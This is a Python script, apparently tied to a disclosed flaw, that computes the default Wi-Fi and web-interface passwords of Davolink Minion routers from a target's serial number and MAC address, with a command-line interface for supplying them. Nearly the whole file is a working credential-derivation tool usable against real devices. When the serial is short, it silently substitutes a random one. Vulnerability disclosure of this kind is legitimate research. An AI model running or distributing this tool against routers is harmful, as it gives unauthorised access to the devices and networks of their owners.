#!/usr/bin/env python3

import argparse
import os

'''
The default Wi-Fi and user interface passwords for the Davolink "Bob" and
"Kevin" Minion routers were found to be calculated in a deterministic way from
two device-specific parameters: the MAC address and Serial Number. Given that
these are available to any Wi-Fi-associated client, this is at best security-
through-obscurity in that the algorithm is not published, but can be obtained
by opening the device and extracting the firmware (as Scorpion Labs did,
though it was admittedly no easy task). The Wi-Fi password is calculated from
the Serial Number alone, while the web-user-interface password is calculated
from the Serial Number and MAC address. The following function will calculate
either; if called from another function then specify all zeros for the MAC
address to calculate the Wi-Fi password. When called from the command line and
no MAC address is specified it will default to this.
'''
def evaluate_default_password(serial, mac):
    '''
    Calculates a Davolink Minion router's default user or Wi-Fi password.

    Keyword Arguments:
    serial -- the Serial Number of the target device
    mac    -- the MAC address of the target device

    Returns:
    The Wi-Fi password (only Serial Number supplied)
    The web user interface password (Serial Number and MAC address supplied)
    '''

    mac = mac.replace(":", "").replace("-", "")[-6:]

    if serial and len(serial) >= 6:
        serial = serial[-6:]
    else:
        rand_bytes = os.urandom(4)
        serial = str(int.from_bytes(rand_bytes, "big"))[:6]

    serial_digits = "".join("0" if c.isalpha() else c for c in serial)

    try:
        mac_value = int(mac, 16)
    except ValueError:
        mac_value = 0

    combined_value = (int(serial_digits) + mac_value) % 1_000_000

    cvA = f"{combined_value:06d}"
    cvB = f"{int(cvA):04x}"[-4:]
    cvC = [cvB[3], cvB[2], cvB[1], cvB[0]] + list(cvA)

    digit_map = {
        "1": "c", "2": "d", "3": "e", "4": "f", "5": "g",
        "6": "h", "7": "i", "8": "j", "9": "k", "0": "z"
    }

    password = ""
    for index, p in enumerate(cvC, start = 1):
        if index in (3, 4, 7, 8):
            password += digit_map.get(p, p)
        else:
            password += p

    return password


def main():
    parser = argparse.ArgumentParser(
        description="Generate WiFi or user passwords.",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "-s",
        "--serial",
        required = True,
        help = "Serial number of target (always required)")
    parser.add_argument(
        "-m",
        "--mac",
        default = "000000000000",
        help = "MAC address of target Minion (required for user password)")
    parser.add_argument(
        "-d",
        "--display",
        action = "store_true",
        help = "Display the results in stdout (default: false)")
    parser.add_argument(
        "-v",
        "--verbose",
        action = "store_true",
        help = "increase output verbosity (currently not implemented)")

    args = parser.parse_args()

    serial = args.serial
    mac = args.mac

    password = evaluate_default_password(args.serial, args.mac)

    if args.display:
        print(password)

    exit(0)

if __name__ == "__main__":
    main()
